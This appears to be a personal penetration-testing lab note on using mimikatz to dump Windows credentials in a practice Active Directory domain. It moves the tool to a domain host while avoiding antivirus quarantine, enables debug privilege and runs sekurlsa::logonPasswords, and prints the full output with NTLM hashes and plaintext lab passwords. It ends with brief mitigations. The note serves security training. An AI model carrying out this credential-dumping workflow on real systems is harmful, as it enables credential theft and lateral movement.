#mimikatz 
- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- Jump credentials stored in memory
- Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket, and Golden Ticket

MUST OBFUSCATE AS AV WILL PICK IT UP

Step 1: install mimikatz

From Kali, navigate to https://github.com/gentilkiwi/mimikatz, Click releases, Download latest mimikatz_trunk.zip, Open, go to x64, extract them to `~/Documents/PEH/mimikatz`

Step 2: Transfer to SPIDERMAN (Domain joined host)
- Copy from GUI to RDP
Or
- In kali:
	- `python3 -m http.server 80`
- From Edge browser in SPIDERMAN (Domain joined host)
	- navigate to Kali IP address and find mimikatz files
	- click on the four mimikatz files from x64 folder previously downloaded. Make sure Keep & Keep Anyway actions are selected so AV does not quarantine. They will be in Downloads folder.
- Or from PS cmd line:
	- `PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.8.0.2:8000/mimikatz.exe C:\mimikatz.exe`

Step 3: Run `mimikatz.exe` *MUST RUN AS ADMIN... OR ELSE PASSWORDS WONT SHOW OR WILL BE `(null)`*
- Run CMD as Administrator, navigate to Downloads folder, run `mimikatz.exe`
```
Directory of C:\Users\peterparker\Downloads                                                                                                                                         07/03/2024  01:23 PM    <DIR>          .                                                  07/03/2024  01:23 PM    <DIR>          ..                                                 07/03/2024  01:23 PM            37,208 mimidrv.sys                                        07/03/2024  01:23 PM         1,355,264 mimikatz.exe                                       07/03/2024  01:23 PM            37,376 mimilib.dll                                        07/03/2024  01:23 PM            10,752 mimispool.dll                                      4 File(s)      1,440,600 bytes                                                            2 Dir(s)  39,707,910,144 bytes free                                                                                                                                                 C:\Users\peterparker\Downloads>mimikatz.exe                                                                                                                                         .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                   ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                                             mimikatz #                    
```

Step 4: Configure `mimikatz`
- Set privilege mode to debug. Gives permission to run all the attacks we would want. Check privilege modules available with `privilege ::`
```
mimikatz # privilege ::
ERROR mimikatz_doLocal ; "privilege" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname
```

```
mimikatz # privilege::debug
Privilege '20' OK
```

Step 5: `sekurlsa` module

```
mimikatz # sekurlsa::
ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !

Module :        sekurlsa
Full name :     SekurLSA module
Description :   Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager
```

Can do a lot with mimikatz, but for this we focus on logonPasswords:
```
mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 2206590 (00000000:0021ab7e)
Session           : Interactive from 2
User Name         : peterparker
Domain            : SPIDERMAN
Logon Server      : SPIDERMAN
Logon Time        : 6/26/2024 10:39:53 AM
SID               : S-1-5-21-2652409218-4000540840-4119231354-1002
        msv :
         [00000003] Primary
         * Username : peterparker
         * Domain   : SPIDERMAN
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : peterparker
         * Domain   : SPIDERMAN
         * Password : (null)
        kerberos :
         * Username : peterparker
         * Domain   : SPIDERMAN
         * Password : (null)
        ssp :
         [00000000]
         * Username : administrator
         * Domain   : MARVEL
         * Password : P@$$w0rd!
        credman :
         [00000000]
         * Username : MARVEL\administrator
         * Domain   : HYDRA-DC
         * Password : P@$$w0rd!
        cloudap :

Authentication Id : 0 ; 2206550 (00000000:0021ab56)
Session           : Interactive from 2
User Name         : peterparker
Domain            : SPIDERMAN
Logon Server      : SPIDERMAN
Logon Time        : 6/26/2024 10:39:53 AM
SID               : S-1-5-21-2652409218-4000540840-4119231354-1002
        msv :
         [00000003] Primary
         * Username : peterparker
         * Domain   : SPIDERMAN
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : peterparker
         * Domain   : SPIDERMAN
         * Password : (null)
        kerberos :
         * Username : peterparker
         * Domain   : SPIDERMAN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : MARVEL\administrator
         * Domain   : HYDRA-DC
         * Password : P@$$w0rd!
        cloudap :

Authentication Id : 0 ; 2156007 (00000000:0020e5e7)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/26/2024 10:39:21 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : SPIDERMAN$
         * Domain   : MARVEL.local
         * Password : BY5AwQ\ui= 63+SX*zeJ[.]9BS3NsepPhR%"`#UV8egxP"aEP.T^^gs5@Hnz:K_=5 siVekkhQH57jWyo_Y9O:l>o%rDB\6Q:@EAN6;nl^py1qD`Tx/AHZ1R
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2155980 (00000000:0020e5cc)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/26/2024 10:39:21 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : SPIDERMAN$
         * Domain   : MARVEL.local
         * Password : BY5AwQ\ui= 63+SX*zeJ[.]9BS3NsepPhR%"`#UV8egxP"aEP.T^^gs5@Hnz:K_=5 siVekkhQH57jWyo_Y9O:l>o%rDB\6Q:@EAN6;nl^py1qD`Tx/AHZ1R
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2154361 (00000000:0020df79)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/26/2024 10:39:21 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : SPIDERMAN$
         * Domain   : MARVEL.local
         * Password : BY5AwQ\ui= 63+SX*zeJ[.]9BS3NsepPhR%"`#UV8egxP"aEP.T^^gs5@Hnz:K_=5 siVekkhQH57jWyo_Y9O:l>o%rDB\6Q:@EAN6;nl^py1qD`Tx/AHZ1R
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 464222 (00000000:0007155e)
Session           : Interactive from 1
User Name         : administrator
Domain            : MARVEL
Logon Server      : HYDRA-DC
Logon Time        : 6/26/2024 10:35:05 AM
SID               : S-1-5-21-3809429150-595446586-675097592-500
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/26/2024 10:34:19 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SPIDERMAN$
Domain            : MARVEL
Logon Server      : (null)
Logon Time        : 6/26/2024 10:34:19 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : spiderman$
         * Domain   : MARVEL.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50346 (00000000:0000c4aa)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/26/2024 10:34:19 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : SPIDERMAN$
         * Domain   : MARVEL.local
         * Password : BY5AwQ\ui= 63+SX*zeJ[.]9BS3NsepPhR%"`#UV8egxP"aEP.T^^gs5@Hnz:K_=5 siVekkhQH57jWyo_Y9O:l>o%rDB\6Q:@EAN6;nl^py1qD`Tx/AHZ1R
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 49008 (00000000:0000bf70)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/26/2024 10:34:19 AM
SID               :
        msv :
         [00000003] Primary
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * NTLM     : 5138b9cf4ccdda28a829bfc5e69f2d36
         * SHA1     : 07c79475f6530331faa6ad5351bcb33c32e89411
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SPIDERMAN$
Domain            : MARVEL
Logon Server      : (null)
Logon Time        : 6/26/2024 10:34:19 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SPIDERMAN$
         * Domain   : MARVEL
         * Password : (null)
        kerberos :
         * Username : spiderman$
         * Domain   : MARVEL.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Important to note:
```
        ssp :
         [00000000]
         * Username : administrator
         * Domain   : MARVEL
         * Password : P@$$w0rd!
        credman :
         [00000000]
         * Username : MARVEL\administrator
         * Domain   : HYDRA-DC
         * Password : P@$$w0rd!
```

This is stored in the credmanager in plaintext because of the file share we connected with the Admin credentials.

For this reason, mimikatz can find information that other tools may miss... another reason to try many tools during enumeration to ensure I don't miss anythings.


Mitigation Strategies:
- Keep AV enabled...
- NGFW to detect obfuscated mimikatz

